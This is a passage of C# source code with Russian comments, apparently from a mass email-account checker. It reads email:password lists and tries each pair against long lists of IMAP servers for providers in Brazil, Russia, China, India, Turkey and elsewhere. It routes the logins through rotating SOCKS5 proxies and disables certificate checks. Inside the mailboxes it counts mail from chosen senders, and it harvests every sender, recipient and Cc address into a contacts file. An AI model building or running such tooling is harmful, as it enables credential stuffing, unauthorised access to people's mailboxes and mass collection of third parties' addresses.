                        ("mail.bol.net.in", 993, true, proxy),
                        ("smtp.bol.net.in", 587, true, proxy),
                        ("pop.bol.net.in", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для бразильских провайдеров
                if (domain == "terra.com.br" || domain == "uol.com.br" || domain == "ig.com.br" || domain == "globo.com" || domain == "bol.com.br")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.terra.com.br", 993, true, proxy),
                        ("mail.terra.com.br", 993, true, proxy),
                        ("smtp.terra.com.br", 587, true, proxy),
                        ("pop.terra.com.br", 995, true, proxy),
                        ("mx.terra.com.br", 993, true, proxy),
                        ("secure.terra.com.br", 993, true, proxy),
                        ("secureimap.terra.com.br", 993, true, proxy),
                        ("imap.uol.com.br", 993, true, proxy),
                        ("mail.uol.com.br", 993, true, proxy),
                        ("smtp.uol.com.br", 587, true, proxy),
                        ("pop.uol.com.br", 995, true, proxy),
                        ("mx.uol.com.br", 993, true, proxy),
                        ("secure.uol.com.br", 993, true, proxy),
                        ("secureimap.uol.com.br", 993, true, proxy),
                        ("imap.ig.com.br", 993, true, proxy),
                        ("mail.ig.com.br", 993, true, proxy),
                        ("smtp.ig.com.br", 587, true, proxy),
                        ("pop.ig.com.br", 995, true, proxy),
                        ("mx.ig.com.br", 993, true, proxy),
                        ("secure.ig.com.br", 993, true, proxy),
                        ("secureimap.ig.com.br", 993, true, proxy),
                        ("imap.globo.com", 993, true, proxy),
                        ("mail.globo.com", 993, true, proxy),
                        ("smtp.globo.com", 587, true, proxy),
                        ("pop.globo.com", 995, true, proxy),
                        ("mx.globo.com", 993, true, proxy),
                        ("secure.globo.com", 993, true, proxy),
                        ("secureimap.globo.com", 993, true, proxy),
                        ("imap.bol.com.br", 993, true, proxy),
                        ("mail.bol.com.br", 993, true, proxy),
                        ("smtp.bol.com.br", 587, true, proxy),
                        ("pop.bol.com.br", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для мексиканских провайдеров
                if (domain == "prodigy.net.mx" || domain == "terra.com.mx" || domain == "yahoo.com.mx" || domain == "gmail.com.mx" || domain == "hotmail.com.mx")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.prodigy.net.mx", 993, true, proxy),
                        ("mail.prodigy.net.mx", 993, true, proxy),
                        ("smtp.prodigy.net.mx", 587, true, proxy),
                        ("pop.prodigy.net.mx", 995, true, proxy),
                        ("mx.prodigy.net.mx", 993, true, proxy),
                        ("secure.prodigy.net.mx", 993, true, proxy),
                        ("secureimap.prodigy.net.mx", 993, true, proxy),
                        ("imap.terra.com.mx", 993, true, proxy),
                        ("mail.terra.com.mx", 993, true, proxy),
                        ("smtp.terra.com.mx", 587, true, proxy),
                        ("pop.terra.com.mx", 995, true, proxy),
                        ("mx.terra.com.mx", 993, true, proxy),
                        ("secure.terra.com.mx", 993, true, proxy),
                        ("secureimap.terra.com.mx", 993, true, proxy),
                        ("imap.yahoo.com.mx", 993, true, proxy),
                        ("mail.yahoo.com.mx", 993, true, proxy),
                        ("smtp.yahoo.com.mx", 587, true, proxy),
                        ("pop.yahoo.com.mx", 995, true, proxy),
                        ("mx.yahoo.com.mx", 993, true, proxy),
                        ("secure.yahoo.com.mx", 993, true, proxy),
                        ("secureimap.yahoo.com.mx", 993, true, proxy)
                    });
                }
                
                // Специальная обработка для аргентинских провайдеров
                if (domain == "fibertel.com.ar" || domain == "speedy.com.ar" || domain == "arnet.com.ar" || domain == "ciudad.com.ar" || domain == "yahoo.com.ar")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.fibertel.com.ar", 993, true, proxy),
                        ("mail.fibertel.com.ar", 993, true, proxy),
                        ("smtp.fibertel.com.ar", 587, true, proxy),
                        ("pop.fibertel.com.ar", 995, true, proxy),
                        ("mx.fibertel.com.ar", 993, true, proxy),
                        ("secure.fibertel.com.ar", 993, true, proxy),
                        ("secureimap.fibertel.com.ar", 993, true, proxy),
                        ("imap.speedy.com.ar", 993, true, proxy),
                        ("mail.speedy.com.ar", 993, true, proxy),
                        ("smtp.speedy.com.ar", 587, true, proxy),
                        ("pop.speedy.com.ar", 995, true, proxy),
                        ("mx.speedy.com.ar", 993, true, proxy),
                        ("secure.speedy.com.ar", 993, true, proxy),
                        ("secureimap.speedy.com.ar", 993, true, proxy),
                        ("imap.arnet.com.ar", 993, true, proxy),
                        ("mail.arnet.com.ar", 993, true, proxy),
                        ("smtp.arnet.com.ar", 587, true, proxy),
                        ("pop.arnet.com.ar", 995, true, proxy),
                        ("mx.arnet.com.ar", 993, true, proxy),
                        ("secure.arnet.com.ar", 993, true, proxy),
                        ("secureimap.arnet.com.ar", 993, true, proxy)
                    });
                }
                
                // Специальная обработка для российских провайдеров
                if (domain == "mail.ru" || domain == "bk.ru" || domain == "inbox.ru" || domain == "list.ru" || domain == "yandex.ru" || domain == "rambler.ru")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.mail.ru", 993, true, proxy),
                        ("mail.mail.ru", 993, true, proxy),
                        ("smtp.mail.ru", 587, true, proxy),
                        ("pop.mail.ru", 995, true, proxy),
                        ("mx.mail.ru", 993, true, proxy),
                        ("secure.mail.ru", 993, true, proxy),
                        ("secureimap.mail.ru", 993, true, proxy),
                        ("imap.bk.ru", 993, true, proxy),
                        ("mail.bk.ru", 993, true, proxy),
                        ("smtp.bk.ru", 587, true, proxy),
                        ("pop.bk.ru", 995, true, proxy),
                        ("mx.bk.ru", 993, true, proxy),
                        ("secure.bk.ru", 993, true, proxy),
                        ("secureimap.bk.ru", 993, true, proxy),
                        ("imap.inbox.ru", 993, true, proxy),
                        ("mail.inbox.ru", 993, true, proxy),
                        ("smtp.inbox.ru", 587, true, proxy),
                        ("pop.inbox.ru", 995, true, proxy),
                        ("mx.inbox.ru", 993, true, proxy),
                        ("secure.inbox.ru", 993, true, proxy),
                        ("secureimap.inbox.ru", 993, true, proxy),
                        ("imap.list.ru", 993, true, proxy),
                        ("mail.list.ru", 993, true, proxy),
                        ("smtp.list.ru", 587, true, proxy),
                        ("pop.list.ru", 995, true, proxy),
                        ("mx.list.ru", 993, true, proxy),
                        ("secure.list.ru", 993, true, proxy),
                        ("secureimap.list.ru", 993, true, proxy),
                        ("imap.yandex.ru", 993, true, proxy),
                        ("mail.yandex.ru", 993, true, proxy),
                        ("smtp.yandex.ru", 587, true, proxy),
                        ("pop.yandex.ru", 995, true, proxy),
                        ("mx.yandex.ru", 993, true, proxy),
                        ("secure.yandex.ru", 993, true, proxy),
                        ("secureimap.yandex.ru", 993, true, proxy),
                        ("imap.rambler.ru", 993, true, proxy),
                        ("mail.rambler.ru", 993, true, proxy),
                        ("smtp.rambler.ru", 587, true, proxy),
                        ("pop.rambler.ru", 995, true, proxy),
                        ("mx.rambler.ru", 993, true, proxy),
                        ("secure.rambler.ru", 993, true, proxy),
                        ("secureimap.rambler.ru", 993, true, proxy)
                    });
                }
                
                // Специальная обработка для украинских провайдеров
                if (domain == "ukr.net" || domain == "i.ua" || domain == "meta.ua" || domain == "bigmir.net" || domain == "rambler.ua")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.ukr.net", 993, true, proxy),
                        ("mail.ukr.net", 993, true, proxy),
                        ("smtp.ukr.net", 587, true, proxy),
                        ("pop.ukr.net", 995, true, proxy),
                        ("mx.ukr.net", 993, true, proxy),
                        ("secure.ukr.net", 993, true, proxy),
                        ("secureimap.ukr.net", 993, true, proxy),
                        ("imap.i.ua", 993, true, proxy),
                        ("mail.i.ua", 993, true, proxy),
                        ("smtp.i.ua", 587, true, proxy),
                        ("pop.i.ua", 995, true, proxy),
                        ("mx.i.ua", 993, true, proxy),
                        ("secure.i.ua", 993, true, proxy),
                        ("secureimap.i.ua", 993, true, proxy),
                        ("imap.meta.ua", 993, true, proxy),
                        ("mail.meta.ua", 993, true, proxy),
                        ("smtp.meta.ua", 587, true, proxy),
                        ("pop.meta.ua", 995, true, proxy),
                        ("mx.meta.ua", 993, true, proxy),
                        ("secure.meta.ua", 993, true, proxy),
                        ("secureimap.meta.ua", 993, true, proxy),
                        ("imap.bigmir.net", 993, true, proxy),
                        ("mail.bigmir.net", 993, true, proxy),
                        ("smtp.bigmir.net", 587, true, proxy),
                        ("pop.bigmir.net", 995, true, proxy),
                        ("mx.bigmir.net", 993, true, proxy),
                        ("secure.bigmir.net", 993, true, proxy),
                        ("secureimap.bigmir.net", 993, true, proxy),
                        ("imap.rambler.ua", 993, true, proxy),
                        ("mail.rambler.ua", 993, true, proxy),
                        ("smtp.rambler.ua", 587, true, proxy),
                        ("pop.rambler.ua", 995, true, proxy)
                    });
                }
                
                // Специальная обработка для турецких провайдеров
                if (domain == "ttnet.net.tr" || domain == "superonline.com" || domain == "turk.net" || domain == "ttmail.com" || domain == "koc.net")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.ttnet.net.tr", 993, true, proxy),
                        ("mail.ttnet.net.tr", 993, true, proxy),
                        ("smtp.ttnet.net.tr", 587, true, proxy),
                        ("pop.ttnet.net.tr", 995, true, proxy),
                        ("mx.ttnet.net.tr", 993, true, proxy),
                        ("secure.ttnet.net.tr", 993, true, proxy),
                        ("secureimap.ttnet.net.tr", 993, true, proxy),
                        ("imap.superonline.com", 993, true, proxy),
                        ("mail.superonline.com", 993, true, proxy),
                        ("smtp.superonline.com", 587, true, proxy),
                        ("pop.superonline.com", 995, true, proxy),
                        ("mx.superonline.com", 993, true, proxy),
                        ("secure.superonline.com", 993, true, proxy),
                        ("secureimap.superonline.com", 993, true, proxy),
                        ("imap.turk.net", 993, true, proxy),
                        ("mail.turk.net", 993, true, proxy),
                        ("smtp.turk.net", 587, true, proxy),
                        ("pop.turk.net", 995, true, proxy),
                        ("mx.turk.net", 993, true, proxy),
                        ("secure.turk.net", 993, true, proxy),
                        ("secureimap.turk.net", 993, true, proxy),
                        ("imap.ttmail.com", 993, true, proxy),
                        ("mail.ttmail.com", 993, true, proxy),
                        ("smtp.ttmail.com", 587, true, proxy),
                        ("pop.ttmail.com", 995, true, proxy),
                        ("mx.ttmail.com", 993, true, proxy),
                        ("secure.ttmail.com", 993, true, proxy),
                        ("secureimap.ttmail.com", 993, true, proxy)
                    });
                }
                
                // Специальная обработка для китайских провайдеров
                if (domain == "qq.com" || domain == "163.com" || domain == "126.com" || domain == "sina.com" || domain == "sohu.com" || domain == "aliyun.com")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.qq.com", 993, true, proxy),
                        ("mail.qq.com", 993, true, proxy),
                        ("smtp.qq.com", 587, true, proxy),
                        ("pop.qq.com", 995, true, proxy),
                        ("mx.qq.com", 993, true, proxy),
                        ("secure.qq.com", 993, true, proxy),
                        ("secureimap.qq.com", 993, true, proxy),
                        ("imap.163.com", 993, true, proxy),
                        ("mail.163.com", 993, true, proxy),
                        ("smtp.163.com", 587, true, proxy),
                        ("pop.163.com", 995, true, proxy),
                        ("mx.163.com", 993, true, proxy),
                        ("secure.163.com", 993, true, proxy),
                        ("secureimap.163.com", 993, true, proxy),
                        ("imap.126.com", 993, true, proxy),
                        ("mail.126.com", 993, true, proxy),
                        ("smtp.126.com", 587, true, proxy),
                        ("pop.126.com", 995, true, proxy),
                        ("mx.126.com", 993, true, proxy),
                        ("secure.126.com", 993, true, proxy),
                        ("secureimap.126.com", 993, true, proxy),
                        ("imap.sina.com", 993, true, proxy),
                        ("mail.sina.com", 993, true, proxy),
                        ("smtp.sina.com", 587, true, proxy),
                        ("pop.sina.com", 995, true, proxy),
                        ("mx.sina.com", 993, true, proxy),
                        ("secure.sina.com", 993, true, proxy),
                        ("secureimap.sina.com", 993, true, proxy),
                        ("imap.sohu.com", 993, true, proxy),
                        ("mail.sohu.com", 993, true, proxy),
                        ("smtp.sohu.com", 587, true, proxy),
                        ("pop.sohu.com", 995, true, proxy),
                        ("mx.sohu.com", 993, true, proxy),
                        ("secure.sohu.com", 993, true, proxy),
                        ("secureimap.sohu.com", 993, true, proxy),
                        ("imap.aliyun.com", 993, true, proxy),
                        ("mail.aliyun.com", 993, true, proxy),
                        ("smtp.aliyun.com", 587, true, proxy),
                        ("pop.aliyun.com", 995, true, proxy),
                        ("mx.aliyun.com", 993, true, proxy),
                        ("secure.aliyun.com", 993, true, proxy),
                        ("secureimap.aliyun.com", 993, true, proxy)
                    });
                }
                
                // Специальная обработка для индийских провайдеров
                if (domain == "rediffmail.com" || domain == "sify.com" || domain == "vsnl.com" || domain == "airtelmail.com" || domain == "tataindicom.com")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.rediffmail.com", 993, true, proxy),
                        ("mail.rediffmail.com", 993, true, proxy),
                        ("smtp.rediffmail.com", 587, true, proxy),
                        ("pop.rediffmail.com", 995, true, proxy),
                        ("mx.rediffmail.com", 993, true, proxy),
                        ("secure.rediffmail.com", 993, true, proxy),
                        ("secureimap.rediffmail.com", 993, true, proxy),
                        ("imap.sify.com", 993, true, proxy),
                        ("mail.sify.com", 993, true, proxy),
                        ("smtp.sify.com", 587, true, proxy),
                        ("pop.sify.com", 995, true, proxy),
                        ("mx.sify.com", 993, true, proxy),
                        ("secure.sify.com", 993, true, proxy),
                        ("secureimap.sify.com", 993, true, proxy),
                        ("imap.vsnl.com", 993, true, proxy),
                        ("mail.vsnl.com", 993, true, proxy),
                        ("smtp.vsnl.com", 587, true, proxy),
                        ("pop.vsnl.com", 995, true, proxy),
                        ("mx.vsnl.com", 993, true, proxy),
                        ("secure.vsnl.com", 993, true, proxy),
                        ("secureimap.vsnl.com", 993, true, proxy),
                        ("imap.airtelmail.com", 993, true, proxy),
                        ("mail.airtelmail.com", 993, true, proxy),
                        ("smtp.airtelmail.com", 587, true, proxy),
                        ("pop.airtelmail.com", 995, true, proxy),
                        ("mx.airtelmail.com", 993, true, proxy),
                        ("secure.airtelmail.com", 993, true, proxy),
                        ("secureimap.airtelmail.com", 993, true, proxy),
                        ("imap.tataindicom.com", 993, true, proxy),
                        ("mail.tataindicom.com", 993, true, proxy),
                        ("smtp.tataindicom.com", 587, true, proxy),
                        ("pop.tataindicom.com", 995, true, proxy),
                        ("mx.tataindicom.com", 993, true, proxy),
                        ("secure.tataindicom.com", 993, true, proxy),
                        ("secureimap.tataindicom.com", 993, true, proxy)
                    });
                }
                
                // Специальная обработка для arcor.de
                if (domain == "arcor.de")
                {
                    extendedAttempts.AddRange(new[]
                    {
                        ("imap.arcor.de", 993, true, proxy),
                        ("mail.arcor.de", 993, true, proxy),
                        ("smtp.arcor.de", 587, true, proxy),
                        ("pop.arcor.de", 995, true, proxy),
                        ("mx.arcor.de", 993, true, proxy),
                        ("imap.mail.arcor.de", 993, true, proxy),
                        ("mail.mail.arcor.de", 993, true, proxy),
                        ("smtp.mail.arcor.de", 587, true, proxy),
                        ("secure.arcor.de", 993, true, proxy),
                        ("secureimap.arcor.de", 993, true, proxy),
                        ("imap.1und1.de", 993, true, proxy),
                        ("mail.1und1.de", 993, true, proxy),
                        ("smtp.1und1.de", 587, true, proxy),
                        ("imap.gmx.de", 993, true, proxy),
                        ("mail.gmx.de", 993, true, proxy),
                        ("imap.web.de", 993, true, proxy),
                        ("mail.web.de", 993, true, proxy)
                    });
                }
                
                Console.WriteLine($"[DEBUG] Попытки подключения для {email}: {string.Join(", ", extendedAttempts.Select(a => $"{a.server}:{a.port}"))}");
                
                // Пробуем каждый сервер с увеличенным таймаутом
                foreach (var attempt in extendedAttempts)
                {
                    try
                    {
                        var attemptList = new List<(string server, int port, bool ssl, string? proxy)> { attempt };
                        result = await ImapHelper.TryConnectAsync(email, password, attemptList, maxTimeout, proxy);
                        Console.WriteLine($"[DEBUG] Попытка {attempt.server}:{attempt.port} для {email}: {result.Success} - {result.Message}");
                        if (result.Success) return result;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[DEBUG] Ошибка при попытке {attempt.server}:{attempt.port} для {email}: {ex.Message}");
                    }
                }
            }

            return result;
        }

        private async Task<Dictionary<string, int>> ScanFoldersOptimized(ImapClient client, List<string> senders)
        {
            var senderCounts = new Dictionary<string, int>();
            var priorityFolders = new[] { "INBOX", "Sent", "Drafts", "Archive" };
            
            try
            {
                var folders = client.GetFolders(client.PersonalNamespaces[0]);
                var folderList = folders.ToList();
                
                // Сначала сканируем приоритетные папки
                foreach (var priorityFolder in priorityFolders)
                {
                    var folder = folderList.FirstOrDefault(f => f.Name.Equals(priorityFolder, StringComparison.OrdinalIgnoreCase));
                    if (folder != null)
                    {
                        await folder.OpenAsync(FolderAccess.ReadOnly);
                        var count = await ScanFolderForSenders(folder, senders);
                        
                        foreach (var kvp in count)
                        {
                            if (senderCounts.ContainsKey(kvp.Key))
                                senderCounts[kvp.Key] += kvp.Value;
                            else
                                senderCounts[kvp.Key] = kvp.Value;
                        }
                        
                        await folder.CloseAsync();
                        
                        // Если нашли письма в приоритетной папке, прекращаем сканирование
                        if (senderCounts.Values.Sum() > 0)
                            return senderCounts;
                    }
                }
                
                // Если в приоритетных папках ничего не найдено, сканируем остальные (максимум 5)
                if (senderCounts.Values.Sum() == 0)
                {
                    int scannedFolders = 0;
                    foreach (var folder in folderList)
                    {
                        if (priorityFolders.Contains(folder.Name)) continue;
                        if (scannedFolders >= 5) break; // Ограничиваем количество папок
                        
                        try
                        {
                            await folder.OpenAsync(FolderAccess.ReadOnly);
                            var count = await ScanFolderForSenders(folder, senders);
                            
                            foreach (var kvp in count)
                            {
                                if (senderCounts.ContainsKey(kvp.Key))
                                    senderCounts[kvp.Key] += kvp.Value;
                                else
                                    senderCounts[kvp.Key] = kvp.Value;
                            }
                            
                            await folder.CloseAsync();
                            scannedFolders++;
                            
                            // Если нашли письма, прекращаем сканирование
                            if (senderCounts.Values.Sum() > 0)
                                break;
                        }
                        catch
                        {
                            // Игнорируем ошибки при сканировании отдельных папок
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при сканировании папок: {ex.Message}");
            }
            
            return senderCounts;
        }

        private async Task<Dictionary<string, int>> ScanFolderForSenders(IMailFolder folder, List<string> senders)
        {
            var results = new Dictionary<string, int>();
            
            try
            {
                var count = folder.Count;
                if (count == 0) return results;
                
                // Сканируем последние 50 сообщений для максимальной скорости
                var startIndex = Math.Max(0, count - 50);
                var messageSummaries = await folder.FetchAsync(startIndex, -1, MessageSummaryItems.Envelope | MessageSummaryItems.UniqueId);
                
                // Предварительная фильтрация отправителей для быстрого поиска
                var senderDomains = senders.Where(s => !s.Contains("@")).ToHashSet(StringComparer.OrdinalIgnoreCase);
                var senderEmails = senders.Where(s => s.Contains("@")).ToHashSet(StringComparer.OrdinalIgnoreCase);
                
                foreach (var summary in messageSummaries)
                {
                    if (summary.Envelope?.From?.Mailboxes != null)
                    {
                        foreach (var mailbox in summary.Envelope.From.Mailboxes)
                        {
                            var senderEmail = mailbox.Address?.ToLower() ?? "";
                            if (string.IsNullOrEmpty(senderEmail)) continue;
                            
                            var senderDomain = senderEmail.Split('@').LastOrDefault() ?? "";
                            
                            // Быстрая проверка по домену
                            if (senderDomains.Contains(senderDomain))
                            {
                                var targetSender = senders.FirstOrDefault(s => !s.Contains("@") && s.Equals(senderDomain, StringComparison.OrdinalIgnoreCase));
                                if (targetSender != null)
                                {
                                    if (results.ContainsKey(targetSender))
                                        results[targetSender]++;
                                    else
                                        results[targetSender] = 1;
                                }
                            }
                            
                            // Быстрая проверка по email
                            if (senderEmails.Contains(senderEmail))
                            {
                                var targetSender = senders.FirstOrDefault(s => s.Equals(senderEmail, StringComparison.OrdinalIgnoreCase));
                                if (targetSender != null)
                                {
                                    if (results.ContainsKey(targetSender))
                                        results[targetSender]++;
                                    else
                                        results[targetSender] = 1;
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при сканировании папки {folder.Name}: {ex.Message}");
            }
            
            return results;
        }

        private async Task StartContactsCollection()
        {
            Console.Clear();
            DrawHeader("📧 СБОР КОНТАКТОВ", "Извлечение всех email-адресов из почтовых ящиков", 80);
            
            // Сброс статистики
            processedAccounts = 0;
            validAccounts = 0;
            isScanning = true;
            
            // Очищаем файл с контактами перед началом
            if (File.Exists(contactsFile))
                File.Delete(contactsFile);
            
            // Создаем пустой файл, чтобы он гарантированно существовал
            File.Create(contactsFile).Dispose();
            
            // Запускаем сбор контактов
            await CollectAllContactsRealTime();
            
            isScanning = false;
            Console.WriteLine("\n✅ Сбор контактов завершен!");
            // Гарантируем что файл существует перед чтением
            if (!File.Exists(contactsFile))
                File.Create(contactsFile).Dispose();
                
            var allLines = File.ReadAllLines(contactsFile).Where(l => !string.IsNullOrWhiteSpace(l)).Count();
            Console.WriteLine($"Всего извлечено уникальных контактов: {allLines}");
            Console.WriteLine("Нажмите любую клавишу для возврата в меню...");
            Console.ReadKey();
        }

        private async Task CollectAllContactsRealTime()
        {
            scanStartTime = DateTime.Now;
            
            var rawAccounts = File.ReadAllLines(accountsFile).Where(l => !string.IsNullOrWhiteSpace(l)).Select(l => l.Trim()).ToList();
            var accounts = new List<(string Email, string Password)>();
            totalAccounts = rawAccounts.Count;
            foreach (var l in rawAccounts)
            {
                var parts = l.Split(new[] { ':', ';' }, 2);
                var email = parts[0].Trim();
                var pass = parts.Length > 1 ? parts[1].Trim() : "";
                if (!IsValidEmail(email)) continue;
                accounts.Add((email, pass));
            }

            // Для потокобезопасного хранения уникальных контактов
            var allContacts = new ConcurrentHashSet<string>();
            var errors = new ConcurrentBag<string>();
            var throttler = new SemaphoreSlim(maxThreads); // Исправляем многозадачность: SemaphoreSlim ограничивает количество одновременных потоков
            int processed = 0;
            var accountResults = new string[accounts.Count];
            var colorResults = new ConsoleColor[accounts.Count];
            var tasks = new List<Task>();
            var printLock = new object();

            // Запускаем задачу для отображения прогресса
            var progressTask = ShowScanProgress();

            // Обрабатываем каждый аккаунт параллельно с ограничением потоков
            for (int i = 0; i < accounts.Count; i++)
            {
                int accIndex = i;
                var acc = accounts[i];
                
                tasks.Add(Task.Run(async () =>
                {
                    await throttler.WaitAsync();
                    try
                    {
                        string? proxyStr = proxyEnabled && proxyManager != null ? proxyManager.GetNextProxy() : null;
                        // Используем уже работающий метод для подключения (как в основной проверке)
                        var domain = acc.Email.Split('@')[1];
                        var attempts = ImapHelper.GetImapDictionary();
                        if (!attempts.ContainsKey(domain))
                        {
                            lock (printLock) { accountResults[accIndex] = $"❌ {acc.Email}: домен не поддерживается"; colorResults[accIndex] = ConsoleColor.Red; }
                            return;
                        }
                        var imapSettings = attempts[domain];
                        string server = imapSettings.Item1;
                        int port = imapSettings.Item2;
                        bool ssl = imapSettings.Item3;
                        
                        using var client = new ImapClient();
                        client.ServerCertificateValidationCallback = (s, c, h, e) => true;
                        
                        try
                        {
                            var socketOptions = ssl ? SecureSocketOptions.SslOnConnect : SecureSocketOptions.StartTls;
                            
                            // Используем тот же способ подключения через прокси, что и в основной проверке
                            if (proxyStr != null && proxyStr.StartsWith("socks5://"))
                            {
                                var cleanProxy = proxyStr.Replace("socks5://", "");
                                string proxyHost;
                                int proxyPort;
                                
                                // Обрабатываем формат с аутентификацией: user:pass@host:port
                                if (cleanProxy.Contains('@'))
                                {
                                    var atParts = cleanProxy.Split('@');
                                    var hostPortPart = atParts[atParts.Length - 1];
                                    var hostPortParts = hostPortPart.Split(':');
                                    if (hostPortParts.Length >= 2 && int.TryParse(hostPortParts[1], out proxyPort))
                                    {
                                        proxyHost = hostPortParts[0];
                                        var proxy = new MailKit.Net.Proxy.Socks5Client(proxyHost, proxyPort);
                                        client.ProxyClient = proxy;
                                    }
                                }
                                else
                                {
                                    // Обычный формат: host:port
                                    var proxyParts = cleanProxy.Split(':');
                                    if (proxyParts.Length >= 2 && int.TryParse(proxyParts[1], out proxyPort))
                                    {
                                        var proxy = new MailKit.Net.Proxy.Socks5Client(proxyParts[0], proxyPort);
                                        client.ProxyClient = proxy;
                                    }
                                }
                            }
                            
                            // Подключаемся без лишних параметров
                            await client.ConnectAsync(server, port, socketOptions);

                            // Извлекаем все контакты из всех доступных папок
                            var contacts = await ExtractAllContactsFromMailbox(client);
                            foreach (var contact in contacts)
                            {
                                if (allContacts.Add(contact))
                                {
                                    lock (_contactsFileLock)
                                    {
                                        File.AppendAllText(contactsFile, $"{contact}{Environment.NewLine}");
                                    }
                                }
                            }

                            Interlocked.Increment(ref validAccounts);
                            lock (printLock) { accountResults[accIndex] = $"✅ {acc.Email}: извлечено {contacts.Count} контактов"; colorResults[accIndex] = ConsoleColor.Green; }
                        }
                        catch (Exception ex)
                        {
                            lock (printLock) { accountResults[accIndex] = $"❌ {acc.Email}: {ex.Message.Substring(0, Math.Min(ex.Message.Length, 50))}"; colorResults[accIndex] = ConsoleColor.Red; }
                            errors.Add($"{acc.Email}: {ex.Message}");
                        }
                        finally
                        {
                            if (client.IsConnected)
                                await client.DisconnectAsync(true);
                        }
                    }
                    finally
                    {
                        Interlocked.Increment(ref processedAccounts);
                        throttler.Release();
                    }
                }));
            }

            await Task.WhenAll(tasks);
            await progressTask;
            
            // Финальная очистка дубликатов в файле (гарантируем что их не осталось)
            var allLines = File.ReadAllLines(contactsFile).Distinct().ToList();
            File.WriteAllLines(contactsFile, allLines);
            Console.WriteLine($"\n✅ Сбор контактов завершен! Всего уникальных контактов сохранено: {allLines.Count}");
        }

        private async Task<HashSet<string>> ExtractAllContactsFromMailbox(ImapClient client)
        {
            var contacts = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            var folders = client.GetFolders(client.PersonalNamespaces[0]);
            
            foreach (var folder in folders)
            {
                try
                {
                    if (!folder.IsOpen)
                        await folder.OpenAsync(FolderAccess.ReadOnly);
                    
                    // Сканируем все сообщения (но не больше 1000 для производительности)
                    var messageCount = folder.Count;
                    if (messageCount == 0) continue;
                    
                    var startIndex = Math.Max(0, messageCount - 1000); // Последние 1000 сообщений, чтобы не перегружать
                    var messageSummaries = await folder.FetchAsync(startIndex, -1, MessageSummaryItems.Envelope);
                    
                    foreach (var msg in messageSummaries)
                    {
                        // Добавляем отправителя (тот, кто писал на эту почту)
                        if (msg.Envelope?.From != null)
                        {
                            foreach (var addr in msg.Envelope.From)
                            {
                                if (addr is MailboxAddress mailboxAddr && !string.IsNullOrWhiteSpace(mailboxAddr.Address) && IsValidEmail(mailboxAddr.Address))
                                    contacts.Add(mailboxAddr.Address.ToLowerInvariant());
                            }
                        }
                        
                        // Добавляем получателей (те, кому писала эта почта)
                        if (msg.Envelope?.To != null)
                        {
                            foreach (var addr in msg.Envelope.To)
                            {
                                if (addr is MailboxAddress mailboxAddr && !string.IsNullOrWhiteSpace(mailboxAddr.Address) && IsValidEmail(mailboxAddr.Address))
                                    contacts.Add(mailboxAddr.Address.ToLowerInvariant());
                            }
                        }
                        
                        // Добавляем копии
                        if (msg.Envelope?.Cc != null)
                        {
                            foreach (var addr in msg.Envelope.Cc)
                            {
                                if (addr is MailboxAddress mailboxAddr && !string.IsNullOrWhiteSpace(mailboxAddr.Address) && IsValidEmail(mailboxAddr.Address))
                                    contacts.Add(mailboxAddr.Address.ToLowerInvariant());
                            }
                        }
                    }
                    
                    await folder.CloseAsync();
                }
                catch
                {
                    // Игнорируем ошибки доступа к отдельным папкам
                    continue;
                }
            }
            
            return contacts;
        }

        // Вспомогательный класс для потокобезопасного набора
        private class ConcurrentHashSet<T> : HashSet<T>
        {
            private readonly object _lock = new object();
            
            public new bool Add(T item)
            {
                lock (_lock) return base.Add(item);
            }
        }

        private async Task ScanAllAccountsWithRealTime()
        {
            scanStartTime = DateTime.Now;
            
            var rawAccounts = File.ReadAllLines(accountsFile).Where(l => !string.IsNullOrWhiteSpace(l)).Select(l => l.Trim()).ToList();
            var accounts = new List<(string Email, string Password)>();
            totalAccounts = rawAccounts.Count;
            foreach (var l in rawAccounts)
            {
                var parts = l.Split(new[] { ':', ';' }, 2);
                var email = parts[0].Trim();
                var pass = parts.Length > 1 ? parts[1].Trim() : "";
                if (!IsValidEmail(email)) continue;
                accounts.Add((email, pass));
            }

            var senders = File.ReadAllLines(sendersFile).Where(l => !string.IsNullOrWhiteSpace(l)).Select(l => l.Trim()).ToList();
            if (senders.Count == 0)
            {
                UI.WriteLine("senders.txt пустой — нечего сканировать.", ConsoleColor.Red);
                return;
            }

            var workingAccounts = new ConcurrentBag<(string Record, Dictionary<string, int> Counts)>();
            var errors = new ConcurrentBag<string>();
            var throttler = new SemaphoreSlim(maxThreads); // Исправляем Semaphore: правильно ограничиваем количество потоков
            int processed = 0;
            int validCount = 0;
            int foundCount = 0;
            var accountResults = new string[accounts.Count];
            var colorResults = new ConsoleColor[accounts.Count];
            var tasks = new List<Task>();
            var printLock = new object();

            for (int i = 0; i < accounts.Count; i++)
            {
                int accIndex = i;
                var acc = accounts[i];
                var proxy = proxyEnabled ? proxyManager.GetNextProxy() : null;
                var task = Task.Run(async () =>
                {
                    await throttler.WaitAsync();
                    string statusMsg = "";
                    ConsoleColor color = ConsoleColor.DarkGray;
                    string accDisp = $"{acc.Email}";
                    try
                    {
                        var domain = acc.Email.Split('@').LastOrDefault()?.ToLower() ?? "";
                        if (string.IsNullOrEmpty(domain))
                        {
                            errors.Add($"{acc.Email} - неверный формат email");
                            statusMsg = $"{acc.Email} - неверный формат email";
                            color = ConsoleColor.Red;
                            realTimeResults.Add($"❌ {acc.Email} - неверный формат email");
                        }
                        else
                        {
                            // Быстрая проверка - если домен не поддерживается, пропускаем
                            if (!ImapHelper.GetImapDictionary().ContainsKey(domain))
                            {
                                errors.Add($"{acc.Email} - домен не поддерживается");
                                statusMsg = $"{accDisp} - домен не поддерживается";
                                color = ConsoleColor.Red;
                                realTimeResults.Add($"❌ {accDisp} - домен не поддерживается");
                            }
                            else
                            {
                                // Используем оптимизированный метод подключения с повторными попытками
